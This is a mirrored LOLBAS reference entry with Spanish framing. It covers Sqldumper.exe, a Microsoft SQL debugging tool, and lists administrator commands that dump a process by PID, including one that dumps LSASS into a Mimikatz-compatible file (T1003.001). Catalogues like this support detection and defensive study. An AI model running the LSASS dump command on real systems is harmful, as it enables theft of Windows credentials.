# LOLBAS: Sqldumper.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Dump`

Debugging utility included with Microsoft SQL.

## Comandos

### Dump process using PID.

Dump · priv: Administrator · T1003

```cmd
sqldumper.exe 464 0 0x0110
```

Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).

### Dump LSASS.exe to Mimikatz compatible dump using PID.

Dump · priv: Administrator · T1003.001

```cmd
sqldumper.exe 540 0 0x01100:40
```

0x01100:40 flag will create a Mimikatz compatible dump file.

